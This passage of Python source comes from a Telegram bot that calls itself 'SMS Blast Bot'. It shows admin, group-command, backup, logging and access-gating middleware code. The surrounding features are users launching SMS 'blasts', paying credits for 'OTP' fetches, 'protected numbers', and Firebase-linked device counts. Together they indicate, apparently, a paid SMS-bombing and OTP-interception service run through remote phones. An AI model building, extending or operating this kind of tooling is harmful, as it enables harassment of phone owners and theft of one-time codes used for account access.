    try:
        return json.dumps(value, sort_keys=True, ensure_ascii=False, separators=(",", ":"))
    except (TypeError, ValueError):
        return repr(value)

def _json_import_merge(existing, incoming, path=()):
    protected = {
        "owners", "admins", "super_admins", "admin_ids", "owner_id", "main_owner",
        "token", "bot_token", "api_token", "github_token", "credentials", "secrets",
        "firebase", "firebase_config", "firebase_devices", "device_targets", "targets",
        "bot_settings", "settings", "config", "webhook_secret", "password", "passwords",
        "terms",
    }
    added = 0
    if not isinstance(incoming, dict):
        return existing, 0
    if not isinstance(existing, dict):
        existing = {}
    for key, value in incoming.items():
        key_text = str(key)
        key_norm = key_text.lower().replace("-", "_").replace(" ", "_")
        if key_norm in protected or any(
            part.lower().replace("-", "_") in protected for part in path
        ):
            continue
        if key_norm == "users" and isinstance(value, dict):
            current_users = existing.get(key)
            if not isinstance(current_users, dict):
                current_users = {}
                existing[key] = current_users
            for user_id, user_record in value.items():
                if str(user_id) not in current_users and isinstance(user_record, dict):
                    current_users[str(user_id)] = user_record
                    added += 1
            continue
        if key not in existing:
            existing[key] = value
            added += 1
            continue
        current = existing[key]
        if isinstance(current, dict) and isinstance(value, dict):
            _, n = _json_import_merge(current, value, path + (key_text,))
            added += n
        elif isinstance(current, list) and isinstance(value, list):
            seen = {_json_import_signature(item) for item in current}
            for item in value:
                sig = _json_import_signature(item)
                if sig not in seen:
                    current.append(item)
                    seen.add(sig)
                    added += 1
    return existing, added

@R.message(S.import_data_file, F.document)
async def admin_data_import_receive(m: Message, state: FSMContext):
    d = load()
    uid = m.from_user.id
    if not is_admin(uid, d):
        await state.clear()
        return
    doc = m.document
    filename = (doc.file_name or "").lower()
    if not filename.endswith(".json"):
        await m.answer("❌ Please send a .json document, or /cancel.")
        return
    if (doc.file_size or 0) > 5 * 1024 * 1024:
        await m.answer("❌ File too big (max 5MB).")
        return
    try:
        file_info = await m.bot.get_file(doc.file_id)
        downloaded = await m.bot.download_file(file_info.file_path)
        raw = downloaded.read() if hasattr(downloaded, "read") else downloaded
        if not isinstance(raw, (bytes, bytearray)):
            raise ValueError("Could not read file")
        payload = json.loads(raw.decode("utf-8-sig"))
        if not isinstance(payload, dict):
            raise ValueError("JSON root must be an object")
    except Exception as exc:
        log.warning("JSON import rejected for admin %s: %s", uid, type(exc).__name__)
        await m.answer("❌ JSON read/parse failed. Check that it is a valid UTF-8 JSON object within Telegram's upload/download limits.")
        return

    try:
        _, count = _json_import_merge(d, payload)
        log_audit(d, "json_data_import", uid, f"keys={len(payload)}; additions={count}")
        save()
    except Exception:
        await m.answer("❌ Import failed. No changes persisted.")
        log.exception("JSON import failed for admin %s", uid)
        return

    await state.clear()
    await m.answer(
        f"✅ <b>JSON import complete</b>\n"
        f"Top-level keys inspected: <code>{len(payload)}</code>\n"
        f"New keys/items/records added: <code>{count}</code>\n\n"
        f"Existing values and existing user records preserved. Protected sections skipped.",
        parse_mode="HTML",
    )
    _spawn(send_log(m.bot, f"📥 <b>JSON data import</b>\nAdmin: <code>{uid}</code>\nTop-level keys: {len(payload)}\nAdded items/records: {count}"))

@R.message(S.import_data_file)
async def admin_data_import_wrong_file(m: Message, state: FSMContext):
    d = load()
    if not is_admin(m.from_user.id, d):
        await state.clear()
        return
    await m.answer("Please send a .json document, or use /cancel.")

# ═══════════════════════════════════════════════════════════
#  END OF PART 8 — paste PART 9 after this line
# ═══════════════════════════════════════════════════════════
# ============================================================
#  PART 9 — GROUP SUPPORT + COMMANDS + WELCOME + /STOP
#  /stop /start /welcome /mute /unmute /panel in groups
#  /ping /help /backup /restore /logs in DM
#  Group message router + welcome logic
# ============================================================

# ============================================================
#  GROUP — /stop / /start / /welcome / /mute / /unmute / /panel
# ============================================================
@R.message(Command("stop"))
async def cmd_stop(m: Message, state: FSMContext):
    """
    In groups: mute bot in that group (no more auto messages).
    In DM: user's active blast stops.
    """
    chat_type = m.chat.type

    if chat_type in ("group", "supergroup"):
        # Admin only (owner or group admin)
        d = load()
        # check sender is group admin or bot owner/admin
        is_priv = is_owner(m.from_user.id, d) or is_admin(m.from_user.id, d)
        if not is_priv:
            try:
                member = await m.bot.get_chat_member(m.chat.id, m.from_user.id)
                st = str(getattr(member, "status", "")).lower()
                if st not in ("administrator", "creator"):
                    await m.answer(
                        f"🚫 Admin only.",
                        parse_mode="HTML",
                    )
                    return
            except Exception:
                await m.answer(f"🚫 Admin only.", parse_mode="HTML")
                return

        set_group_muted(m.chat.id, True, d)
        save()
        await m.answer(
            f"🔴 <b>Bot stopped in this group</b>\n\n"
            f"Bot won't send any auto messages here.\n"
            f"Use <code>/start</code> to re-enable.",
            parse_mode="HTML",
        )
        return

    # DM — stop active blast
    uid = m.from_user.id
    async with SESSIONS_LOCK:
        s = USER_SESSIONS.get(uid)
        if not s or (s.task and s.task.done()):
            await m.answer(f"✅ No active blast.", parse_mode="HTML")
            return
        s.cancelled = True
    await m.answer(
        f"🛑 <b>Stop signal sent</b>",
        parse_mode="HTML",
    )

@R.message(Command("start"), F.chat.type.in_({"group", "supergroup"}))
async def cmd_start_group(m: Message, state: FSMContext):
    """Group /start — re-enable bot in group + show panel."""
    d = load()
    is_priv = is_owner(m.from_user.id, d) or is_admin(m.from_user.id, d)
    if not is_priv:
        try:
            member = await m.bot.get_chat_member(m.chat.id, m.from_user.id)
            st = str(getattr(member, "status", "")).lower()
            if st not in ("administrator", "creator"):
                await m.answer(f"🚫 Admin only.", parse_mode="HTML")
                return
        except Exception:
            await m.answer(f"🚫 Admin only.", parse_mode="HTML")
            return

    register_group(m.chat, d)
    set_group_muted(m.chat.id, False, d)
    save()

    await m.answer(
        group_panel_text(d, m.chat.id, m.chat.title or "Group"),
        reply_markup=group_kb(d, m.chat.id),
        parse_mode="HTML",
    )

@R.message(Command("panel"))
async def cmd_panel(m: Message, state: FSMContext):
    """Group panel command."""
    if m.chat.type not in ("group", "supergroup"):
        await m.answer(f"❌ Group only.", parse_mode="HTML")
        return
    d = load()
    is_priv = is_owner(m.from_user.id, d) or is_admin(m.from_user.id, d)
    if not is_priv:
        try:
            member = await m.bot.get_chat_member(m.chat.id, m.from_user.id)
            st = str(getattr(member, "status", "")).lower()
            if st not in ("administrator", "creator"):
                await m.answer(f"🚫 Admin only.", parse_mode="HTML")
                return
        except Exception:
            await m.answer(f"🚫 Admin only.", parse_mode="HTML")
            return
    register_group(m.chat, d)
    save()
    await m.answer(
        group_panel_text(d, m.chat.id, m.chat.title or "Group"),
        reply_markup=group_kb(d, m.chat.id),
        parse_mode="HTML",
    )

@R.message(Command("welcome"))
async def cmd_welcome(m: Message, state: FSMContext):
    """Welcome on/off in groups."""
    if m.chat.type not in ("group", "supergroup"):
        await m.answer(f"❌ Group only.", parse_mode="HTML")
        return
    d = load()
    is_priv = is_owner(m.from_user.id, d) or is_admin(m.from_user.id, d)
    if not is_priv:
        try:
            member = await m.bot.get_chat_member(m.chat.id, m.from_user.id)
            st = str(getattr(member, "status", "")).lower()
            if st not in ("administrator", "creator"):
                await m.answer(f"🚫 Admin only.", parse_mode="HTML")
                return
        except Exception:
            await m.answer(f"🚫 Admin only.", parse_mode="HTML")
            return

    args = (m.text or "").split(maxsplit=1)
    arg = args[1].strip().lower() if len(args) > 1 else ""

    if arg == "on":
        set_group_welcome(m.chat.id, True, d)
        save()
        await m.answer(
            f"🟢 Welcome messages <b>ON</b>",
            parse_mode="HTML",
        )
    elif arg == "off":
        set_group_welcome(m.chat.id, False, d)
        save()
        await m.answer(
            f"🔴 Welcome messages <b>OFF</b>",
            parse_mode="HTML",
        )
    else:
        cur = is_group_welcome_enabled(m.chat.id, d)
        await m.answer(
            f"👋 Welcome: <b>{'🟢 ON' if cur else '🔴 OFF'}</b>\n\n"
            f"Usage:\n"
            f"<code>/welcome on</code> — enable\n"
            f"<code>/welcome off</code> — disable",
            parse_mode="HTML",
        )

@R.message(Command("mute"))
async def cmd_mute(m: Message, state: FSMContext):
    """Mute bot in group."""
    if m.chat.type not in ("group", "supergroup"):
        await m.answer(f"❌ Group only.", parse_mode="HTML")
        return
    d = load()
    is_priv = is_owner(m.from_user.id, d) or is_admin(m.from_user.id, d)
    if not is_priv:
        try:
            member = await m.bot.get_chat_member(m.chat.id, m.from_user.id)
            st = str(getattr(member, "status", "")).lower()
            if st not in ("administrator", "creator"):
                await m.answer(f"🚫 Admin only.", parse_mode="HTML")
                return
        except Exception:
            await m.answer(f"🚫 Admin only.", parse_mode="HTML")
            return
    set_group_muted(m.chat.id, True, d)
    save()
    await m.answer(f"🔇 Bot muted in this group. Use /start or /unmute.", parse_mode="HTML")

@R.message(Command("unmute"))
async def cmd_unmute(m: Message, state: FSMContext):
    """Unmute bot in group."""
    if m.chat.type not in ("group", "supergroup"):
        await m.answer(f"❌ Group only.", parse_mode="HTML")
        return
    d = load()
    is_priv = is_owner(m.from_user.id, d) or is_admin(m.from_user.id, d)
    if not is_priv:
        try:
            member = await m.bot.get_chat_member(m.chat.id, m.from_user.id)
            st = str(getattr(member, "status", "")).lower()
            if st not in ("administrator", "creator"):
                await m.answer(f"🚫 Admin only.", parse_mode="HTML")
                return
        except Exception:
            await m.answer(f"🚫 Admin only.", parse_mode="HTML")
            return
    set_group_muted(m.chat.id, False, d)
    save()
    await m.answer(f"🔊 Bot unmuted in this group.", parse_mode="HTML")

# ============================================================
#  GROUP CALLBACK HANDLERS
# ============================================================
@R.callback_query(F.data.startswith("group:toggle_mute:"))
async def group_toggle_mute(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id
    is_priv = is_owner(uid, d) or is_admin(uid, d)
    # get chat_id from callback data
    try:
        cid = int(cq.data.split(":")[-1])
    except Exception:
        try:
            await cq.answer("❌")
        except Exception:
            pass
        return
    if not is_priv:
        try:
            member = await cq.bot.get_chat_member(cid, uid)
            st = str(getattr(member, "status", "")).lower()
            if st not in ("administrator", "creator"):
                try:
                    await cq.answer("🚫 Admin only", show_alert=True)
                except Exception:
                    pass
                return
        except Exception:
            try:
                await cq.answer("🚫")
            except Exception:
                pass
            return
    cur = is_group_muted(cid, d)
    set_group_muted(cid, not cur, d)
    save()
    try:
        await cq.answer(f"{'🟢 Bot ON' if cur else '🔴 Bot OFF'}")
    except Exception:
        pass
    await safe_edit(
        cq,
        group_panel_text(d, cid, cq.message.chat.title or "Group"),
        group_kb(d, cid),
    )

@R.callback_query(F.data.startswith("group:toggle_welcome:"))
async def group_toggle_welcome(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id
    is_priv = is_owner(uid, d) or is_admin(uid, d)
    try:
        cid = int(cq.data.split(":")[-1])
    except Exception:
        try:
            await cq.answer("❌")
        except Exception:
            pass
        return
    if not is_priv:
        try:
            member = await cq.bot.get_chat_member(cid, uid)
            st = str(getattr(member, "status", "")).lower()
            if st not in ("administrator", "creator"):
                try:
                    await cq.answer("🚫 Admin only", show_alert=True)
                except Exception:
                    pass
                return
        except Exception:
            try:
                await cq.answer("🚫")
            except Exception:
                pass
            return
    cur = is_group_welcome_enabled(cid, d)
    set_group_welcome(cid, not cur, d)
    save()
    try:
        await cq.answer(f"{'🔴 OFF' if cur else '🟢 ON'}")
    except Exception:
        pass
    await safe_edit(
        cq,
        group_panel_text(d, cid, cq.message.chat.title or "Group"),
        group_kb(d, cid),
    )

@R.callback_query(F.data.startswith("group:refresh:"))
async def group_refresh(cq: CallbackQuery, state: FSMContext):
    d = load()
    try:
        cid = int(cq.data.split(":")[-1])
    except Exception:
        try:
            await cq.answer("❌")
        except Exception:
            pass
        return
    try:
        await cq.answer("🔄")
    except Exception:
        pass
    await safe_edit(
        cq,
        group_panel_text(d, cid, cq.message.chat.title or "Group"),
        group_kb(d, cid),
    )

@R.callback_query(F.data.startswith("group:stats:"))
async def group_stats(cq: CallbackQuery, state: FSMContext):
    d = load()
    try:
        cid = int(cq.data.split(":")[-1])
    except Exception:
        try:
            await cq.answer("❌")
        except Exception:
            pass
        return
    try:
        await cq.answer()
    except Exception:
        pass
    users = d.get("users", {})
    gs = d.get("group_settings", {}).get(str(cid), {})
    muted = gs.get("stop", False)
    welcome = gs.get("welcome", True)
    txt = (
        f"📊 <b>Group Stats</b>\n\n"
        f"🆔 <code>{cid}</code>\n"
        f"🤖 Bot: <b>{'🔴 muted' if muted else '🟢 active'}</b>\n"
        f"👋 Welcome: <b>{'🟢 ON' if welcome else '🔴 OFF'}</b>\n"
        f"👥 Total users in DB: <b>{len(users)}</b>"
    )
    await safe_edit(
        cq, txt,
        InlineKeyboardMarkup(inline_keyboard=[
            [btn("back", f"group:refresh:{cid}", EMOJI_GEAR, "🔙")],
        ]),
    )

# ============================================================
#  GROUP WELCOME — new member handler
# ============================================================
@R.chat_member()
async def welcome_new_chat_member(event: ChatMemberUpdated):
    """Welcome real new members in groups where bot is admin."""
    try:
        d = load()
        chat = event.chat

        # only groups/supergroups
        if chat.type not in ("group", "supergroup"):
            return

        # register group
        register_group(chat, d)

        # check muted
        if is_group_muted(chat.id, d):
            return

        # check welcome enabled
        if not is_group_welcome_enabled(chat.id, d):
            return

        old_status = str(event.old_chat_member.status).lower()
        new_status = str(event.new_chat_member.status).lower()
        member = event.new_chat_member.user

        if member.is_bot:
            return
        if new_status not in ("member", "administrator", "creator", "restricted"):
            return
        if old_status in ("member", "administrator", "creator", "restricted"):
            return

        name = html_escape(member.full_name or "there")
        chat_title = html_escape(chat.title or "this chat")
        welcome = (
            f"🎉 <b>Welcome, {name}!</b>\n\n"
            f"👋 Welcome to <b>{chat_title}</b>.\n"
            f"Please read the rules and enjoy being part of the community. 💙"
        )
        await event.bot.send_message(
            chat.id, welcome,
            parse_mode="HTML",
            disable_web_page_preview=True,
        )
    except Exception as exc:
        log.debug("Welcome message could not be sent: %s", exc)

# ============================================================
#  GROUP MESSAGE HANDLER — muted groups ignore
#  (only for fallback; owner can also handle in groups)
# ============================================================
@R.message(F.chat.type.in_({"group", "supergroup"}))
async def group_message_router(m: Message, state: FSMContext):
    """
    In groups: if muted, do nothing. If enabled, only respond to commands
    that specific handlers didn't catch.
    """
    d = load()
    register_group(m.chat, d)
    save()

    if is_group_muted(m.chat.id, d):
        return  # silent

    # if not muted, we don't spam - only handle @mentions or /commands
    txt = (m.text or "").strip()
    if not txt:
        return

    # command unknown
    if txt.startswith("/"):
        cmd = txt.split()[0].split("@")[0]
        known = {"/stop", "/start", "/panel", "/welcome", "/mute", "/unmute", "/ping", "/help"}
        if cmd in known:
            return  # handled above
        # unknown command — silent
        return

    # non-command — silent unless @bot mention
    try:
        me = await m.bot.get_me()
        if me.username and f"@{me.username}" in txt:
            await m.answer(
                f"🤖 Hi! Use /panel for group settings.\n"
                f"DM me for full features: @{me.username}",
                parse_mode="HTML",
            )
    except Exception:
        pass

# ============================================================
#  /ping / /help / /backup / /restore / /logs — private commands
# ============================================================
@R.message(Command("ping"))
async def cmd_ping(m: Message, state: FSMContext):
    if m.chat.type != "private":
        # in groups, allow if not muted
        d = load()
        if is_group_muted(m.chat.id, d):
            return
    uptime = int(time.time() - _START_TIME)
    d = load()
    fbs = d.get("firebases", [])
    await m.answer(
        f"🏓 <b>Pong!</b>\n\n"
        f"⏱ Uptime: <b>{fmt_duration(uptime)}</b>\n"
        f"📱 Devices: <b>{LAST_KNOWN_DEVICE_COUNT}</b>\n"
        f"🔥 Firebases: <b>{len(fbs)}</b>\n"
        f"⚡ Power: <b>{CURRENT_POWER_MODE}x</b>",
        parse_mode="HTML",
    )

@R.message(Command("help"))
async def cmd_help(m: Message, state: FSMContext):
    await state.clear()
    uid = m.from_user.id
    d = load()
    is_o = is_owner(uid, d)

    if m.chat.type in ("group", "supergroup"):
        # group help
        await m.answer(
            f"🤖 <b>Group Commands</b>\n\n"
            f"<code>/stop</code> — mute bot in this group\n"
            f"<code>/start</code> — re-enable bot\n"
            f"<code>/panel</code> — group settings\n"
            f"<code>/welcome on|off</code> — welcome messages\n"
            f"<code>/mute</code> — mute bot\n"
            f"<code>/unmute</code> — unmute bot\n"
            f"<code>/ping</code> — bot alive check\n\n"
            f"<i>Admin only. DM @{esc((await m.bot.get_me()).username or 'bot')} for full features.</i>",
            parse_mode="HTML",
        )
        return

    lines = [
        f"🤖 <b>SMS Blast Bot {_VERSION}</b>\n",
        "<b>Commands:</b>",
        "/start — Open panel",
        "/ping — Check bot alive",
    ]
    if is_o:
        lines.extend([
            "/backup — Backup data (local + GitHub)",
            "/restore — Restore from GitHub",
            "/logs — Download server log",
            "/help — This help",
        ])
    else:
        lines.append("/help — This help")
    txt = "\n".join(lines)
    await m.answer(txt, parse_mode="HTML")

@R.message(Command("backup"))
async def cmd_backup(m: Message, state: FSMContext):
    if m.chat.type != "private":
        return
    await state.clear()
    uid = m.from_user.id
    d = load()
    if not is_owner(uid, d):
        await m.answer(f"❌ Owner only!", parse_mode="HTML")
        return
    wait = None
    try:
        wait = await m.answer("📦 Creating backup...", parse_mode="HTML")
    except Exception:
        pass
    try:
        if os.path.exists(_DATA_FILE):
            await m.bot.send_document(
                chat_id=LOG_CHANNEL_ID,
                document=FSInputFile(_DATA_FILE),
                caption=f"📦 <b>Manual Backup</b>\n\n"
                        f"📅 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
                parse_mode="HTML",
            )
    except Exception:
        pass
    gh_ok = False
    if GITHUB_ENABLED:
        try:
            await _github_push(d)
            gh_ok = True
        except Exception:
            gh_ok = False
    if wait:
        try:
            await wait.delete()
        except Exception:
            pass
    await m.answer(
        f"✅ <b>Backup done</b>\n\n"
        f"📁 Local: ✅\n"
        f"📤 Log channel: ✅\n"
        f"🐙 GitHub: {'✅' if gh_ok else '❌'}",
        parse_mode="HTML",
    )

@R.message(Command("restore"))
async def cmd_restore(m: Message, state: FSMContext):
    if m.chat.type != "private":
        return
    await state.clear()
    uid = m.from_user.id
    d = load()
    if not is_owner(uid, d):
        await m.answer(f"❌ Owner only!", parse_mode="HTML")
        return
    if not GITHUB_ENABLED:
        await m.answer(f"❌ GitHub not configured.", parse_mode="HTML")
        return
    wait = None
    try:
        wait = await m.answer("📥 Pulling from GitHub...", parse_mode="HTML")
    except Exception:
        pass
    data = await _github_pull()
    if not data:
        if wait:
            try:
                await wait.delete()
            except Exception:
                pass
        await m.answer("❌ No data found on GitHub.", parse_mode="HTML")
        return
    global _DATA_CACHE, PROTECTED_NUMBERS
    _merge(data, _default_data())
    PROTECTED_NUMBERS = data.get("protected_numbers", {}) or {}
    try:
        with open(_DATA_FILE, "w", encoding="utf-8") as f:
            json.dump(data, f, indent=2, ensure_ascii=False)
        _DATA_CACHE = data
    except Exception as e:
        if wait:
            try:
                await wait.delete()
            except Exception:
                pass
        await m.answer(f"❌ Write failed: {esc(str(e)[:80])}", parse_mode="HTML")
        return
    if wait:
        try:
            await wait.delete()
        except Exception:
            pass
    await m.answer(
        f"✅ <b>Restored from GitHub</b>\n\n"
        f"👥 Users: <b>{len(data.get('users', {}))}</b>\n"
        f"🔥 Firebases: <b>{len(data.get('firebases', []))}</b>",
        parse_mode="HTML",
    )

@R.message(Command("logs"))
async def cmd_logs(m: Message, state: FSMContext):
    if m.chat.type != "private":
        return
    await state.clear()
    uid = m.from_user.id
    d = load()
    if not is_owner(uid, d):
        await m.answer(f"❌ Owner only!", parse_mode="HTML")
        return

    lines = ["=" * 60, "SANJIPRO BOT — LOG", "=" * 60]
    lines.append(f"Version: {_VERSION}")
    lines.append(f"Power: {CURRENT_POWER_MODE}x")
    lines.append(f"Uptime: {fmt_duration(int(time.time() - _START_TIME))}")
    lines.append(f"GitHub: {'ENABLED' if GITHUB_ENABLED else 'DISABLED'}")
    lines.append("")
    lines.append(f"[OWNERS] {d.get('owners', [])}")
    lines.append(f"[ADMINS] {d.get('admins', [])}")
    lines.append(f"[BANNED] {d.get('banned', [])}")
    lines.append("")

    fbs = d.get("firebases", [])
    lines.append(f"[FIREBASES] {len(fbs)}")
    for fb in fbs[:50]:
        fc = FB_DEVICE_COUNTS.get(fb["id"], {})
        lines.append(
            f"  {fb.get('label', '?')} | {fb['url']} | online: {fc.get('online', 0)}"
        )
        if fb["id"] in FB_SCAN_ERRORS:
            lines.append(f"    err: {FB_SCAN_ERRORS[fb['id']]}")
    if len(fbs) > 50:
        lines.append(f"  ...+{len(fbs) - 50} more")
    lines.append("")

    users = d.get("users", {})
    lines.append(f"[USERS] {len(users)}")
    for us, ud in list(users.items())[:200]:
        lim = ud.get("max_send_limit")
        ls = "unlim" if lim is None else str(lim)
        ol = ud.get("max_otp_limit")
        ols = "unlim" if ol is None else str(ol)
        terms_ok = "Y" if ud.get("terms_accepted", False) else "N"
        lines.append(
            f"  {us}: {ud.get('name', '?')} | c={ud.get('credits', 0)} | "
            f"coin={ud.get('coins', 0)} | sms_lim={ls} | otp_lim={ols} | terms={terms_ok}"
        )
    if len(users) > 200:
        lines.append(f"  ...+{len(users) - 200} more")
    lines.append("")

    st = d.get("stats", {})
    lines.append(f"[STATS] Sent={st.get('total_sent', 0)} Failed={st.get('total_failed', 0)} OTP={st.get('otp_fetches', 0)} Refunds={st.get('otp_refunds', 0)}")
    lines.append("")

    if FB_SCAN_ERRORS:
        lines.append(f"[FB ERRORS] {len(FB_SCAN_ERRORS)}")
        for fid, err in list(FB_SCAN_ERRORS.items())[:30]:
            lines.append(f"  {fid}: {err}")
        lines.append("")

    lines.append(f"[DEVICES] {len(CACHED_DEVICES)} cached, {LAST_KNOWN_DEVICE_COUNT} shown")
    lines.append(f"[SCAN] last duration: {LAST_SCAN_DURATION:.2f}s")
    lines.append("")

    # groups
    groups = d.get("groups", {})
    lines.append(f"[GROUPS] {len(groups)}")
    for cid, g in list(groups.items())[:30]:
        gs = d.get("group_settings", {}).get(cid, {})
        muted = gs.get("stop", False)
        welcome = gs.get("welcome", True)
        lines.append(f"  {cid}: {g.get('title', '?')} | mute={muted} | welcome={welcome}")
    lines.append("")

    # upcoming
    up = d.get("upcoming_updates", [])
    lines.append(f"[UPCOMING] {len(up)} visible={d.get('upcoming_visible', True)}")
    for u in up[:10]:
        lines.append(f"  {u.get('title', '?')} | eta={u.get('eta', '-')}")
    lines.append("")

    # tickets
    tickets = d.get("tickets", [])
    open_t = [t for t in tickets if t.get("status") == "open"]
    lines.append(f"[TICKETS] total={len(tickets)} open={len(open_t)}")
    lines.append("")

    act = d.get("activity_log", [])[-30:]
    if act:
        lines.append("[ACTIVITY last 30]")
        for e in reversed(act):
            ts = fmt_time(e.get("timestamp", 0))
            lines.append(f"  [{ts}] {e.get('uid', 0)} {e.get('action', '?')} — {e.get('details', '')}")
        lines.append("")

    audit = d.get("audit_log", [])[-30:]
    if audit:
        lines.append("[AUDIT last 30]")
        for e in reversed(audit):
            ts = fmt_time(e.get("timestamp", 0))
            lines.append(f"  [{ts}] {e.get('uid', 0)} {e.get('action', '?')} — {e.get('details', '')}")
        lines.append("")

    lines.append("=" * 60)

    txt = "\n".join(lines)
    payload = txt.encode("utf-8")
    fname = f"sanjipro_logs_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
    try:
        await m.answer_document(
            document=BufferedInputFile(payload, filename=fname),
            caption=f"📜 <b>Log</b> — {_VERSION}",
            parse_mode="HTML",
        )
    except Exception as e:
        await m.answer(f"❌ {esc(str(e)[:80])}", parse_mode="HTML")

# ============================================================
#  /cancel — universal cancel
# ============================================================
@R.message(Command("cancel"))
async def cmd_cancel(m: Message, state: FSMContext):
    await state.clear()
    d = load()
    if is_owner(m.from_user.id, d):
        await m.answer("❌ Cancelled.", reply_markup=owner_kb(d), parse_mode="HTML")
    elif is_admin(m.from_user.id, d):
        await m.answer("❌ Cancelled.", reply_markup=admin_kb(d), parse_mode="HTML")
    else:
        await m.answer("❌ Cancelled.", reply_markup=user_kb(d), parse_mode="HTML")

# ============================================================
#  NOOP handler — some buttons use noop callback
# ============================================================
@R.callback_query(F.data == "noop")
async def noop_handler(cq: CallbackQuery, state: FSMContext):
    try:
        await cq.answer()
    except Exception:
        pass

# ═══════════════════════════════════════════════════════════
#  END OF PART 9 — paste PART 10 after this line
# ═══════════════════════════════════════════════════════════
# ============================================================
#  PART 10 — MIDDLEWARES + LOOPS + ENTRYPOINT (final)
# ============================================================

# ============================================================
#  MIDDLEWARE — Callback Semaphore
# ============================================================
class CallbackSemaphoreMiddleware(BaseMiddleware):
    async def __call__(self, handler, event, data):
        if CALLBACK_SEM is None:
            return await handler(event, data)
        async with CALLBACK_SEM:
            return await handler(event, data)

# ============================================================
#  MIDDLEWARE — User Cooldown
# ============================================================
class UserCooldownMiddleware(BaseMiddleware):
    async def __call__(self, handler, event, data):
        try:
            if isinstance(event, CallbackQuery) and event.from_user:
                uid = event.from_user.id
                now = time.time()
                last = _USER_COOLDOWN.get(uid, 0)
                if now - last < _USER_COOLDOWN_SEC:
                    try:
                        await event.answer()
                    except Exception:
                        pass
                    return
                _USER_COOLDOWN[uid] = now
                if len(_USER_COOLDOWN) > 20000:
                    cutoff = now - 120
                    for k in list(_USER_COOLDOWN.keys()):
                        if _USER_COOLDOWN[k] < cutoff:
                            _USER_COOLDOWN.pop(k, None)
                _touch_activity()
                try:
                    d = load()
                    k = str(uid)
                    if k in d.get("users", {}):
                        d["users"][k]["last_active"] = int(now)
                except Exception:
                    pass
        except Exception:
            pass
        return await handler(event, data)

# ============================================================
#  MIDDLEWARE — Owner Panel Reset
# ============================================================
class OwnerPanelResetMiddleware(BaseMiddleware):
    KEEP_ACTIVE = {
        "owner:home", "owner:refresh", "noop",
        "owner:toggle_maint",
        "owner:set_power:2", "owner:set_power:3",
        "owner:set_power:4", "owner:set_power:5",
        "owner:set_power:10",
        "owner:maint:menu",
    }

    async def __call__(self, handler, event, data):
        try:
            if isinstance(event, CallbackQuery) and event.from_user:
                uid = event.from_user.id
                st = _OWNER_PANEL_STATE.get(uid)
                if st:
                    st["last_user_action"] = time.time()
                    if event.data not in self.KEEP_ACTIVE:
                        st["active"] = False
        except Exception:
            pass
        return await handler(event, data)

# ============================================================
#  MIDDLEWARE — Force Join Guard (fixed)
# ============================================================
class ForceJoinGuardMiddleware(BaseMiddleware):
    async def __call__(self, handler, event, data):
        user = getattr(event, "from_user", None)
        if not user:
            return await handler(event, data)

        # groups: skip force join
        chat = getattr(event, "chat", None) or getattr(getattr(event, "message", None), "chat", None)
        if chat and getattr(chat, "type", None) in ("group", "supergroup"):
            return await handler(event, data)

        uid = user.id
        d = load()

        if is_owner(uid, d) or uid in d.get("force_join", {}).get("bypass", []):
            return await handler(event, data)
        if not d.get("force_join", {}).get("enabled", False):
            return await handler(event, data)
        if not d.get("force_join", {}).get("channels", []):
            return await handler(event, data)

        # allow /start, /help, terms, fj:check, any terms callback
        if isinstance(event, Message):
            txt = (event.text or "").strip()
            if txt.startswith("/start") or txt.startswith("/help") or txt.startswith("/cancel"):
                return await handler(event, data)
        if isinstance(event, CallbackQuery):
            cd = event.data or ""
            if cd == "fj:check" or cd.startswith("terms:"):
                return await handler(event, data)

        try:
            joined, missing = await joined_all(event.bot, uid, d)
        except Exception:
            joined, missing = False, d.get("force_join", {}).get("channels", [])

        if joined:
            return await handler(event, data)

        try:
            if isinstance(event, CallbackQuery):
                await event.answer("Pehle sabhi required channels/groups join karein.", show_alert=True)
                if event.message:
                    await event.message.answer(
                        fj_text(missing),
                        reply_markup=fj_kb(missing),
                        parse_mode="HTML",
                        disable_web_page_preview=True,
                    )
            elif isinstance(event, Message):
                await event.answer(
                    fj_text(missing),
                    reply_markup=fj_kb(missing),
                    parse_mode="HTML",
                    disable_web_page_preview=True,
                )
        except Exception as exc:
            log.debug("Force-join prompt failed: %s", exc)
        return None

# ============================================================
#  MIDDLEWARE — Terms Gate
# ============================================================
class TermsGateMiddleware(BaseMiddleware):
    async def __call__(self, handler, event, data):
        user = getattr(event, "from_user", None)
        if not user:
            return await handler(event, data)

        # groups: skip terms gate
        chat = getattr(event, "chat", None) or getattr(getattr(event, "message", None), "chat", None)
        if chat and getattr(chat, "type", None) in ("group", "supergroup"):
            return await handler(event, data)

        uid = user.id
        d = load()

        if not d.get("settings", {}).get("terms_required", True):
            return await handler(event, data)
        if is_admin(uid, d):
            return await handler(event, data)
        if has_accepted_terms(uid, d):
            return await handler(event, data)

        # allow /start, /help, terms:*, /cancel
        if isinstance(event, Message):
            txt = (event.text or "").strip()
            if txt.startswith("/start") or txt.startswith("/help") or txt.startswith("/cancel"):
                return await handler(event, data)
        if isinstance(event, CallbackQuery):
            cd = event.data or ""
            if cd.startswith("terms:") or cd.startswith("fj:check"):
                return await handler(event, data)

        # block and show terms
        try:
            if isinstance(event, CallbackQuery):
                await event.answer("Pehle terms accept karein.", show_alert=True)
                if event.message:
                    await event.message.answer(
                        terms_text(d),
                        reply_markup=terms_kb(),
                        parse_mode="HTML",
                        disable_web_page_preview=True,
                    )
            elif isinstance(event, Message):
                await event.answer(
                    terms_text(d),
                    reply_markup=terms_kb(),
                    parse_mode="HTML",
                    disable_web_page_preview=True,
                )
        except Exception as exc:
            log.debug("Terms prompt failed: %s", exc)
        return None

# ============================================================
#  MIDDLEWARE — Per-service Maintenance Guard
# ============================================================
class MaintenanceGuardMiddleware(BaseMiddleware):
    # callback prefixes that map to services
    CALLBACK_SERVICE = {
        "user:send": "send_sms",
        "user:otp:menu": "get_otp",
        "otp:fetch": "get_otp",
        "otp:live": "get_otp",
        "user:wallet": "wallet",
        "user:redeem": "redeem",
        "user:refer": "refer",
        "user:transfer": "transfer",
        "user:daily_bonus": "daily_bonus",
        "user:pricing": "pricing",
        "user:random_video": "videos",
        "user:support": "support",
        "user:ticket:new": "support",
        "user:gift:menu": "gift",
        "user:gift:start": "gift",
        "user:upcoming": "upcoming",
        "user:templates:menu": "templates",
    }

    async def __call__(self, handler, event, data):
        if not isinstance(event, CallbackQuery):
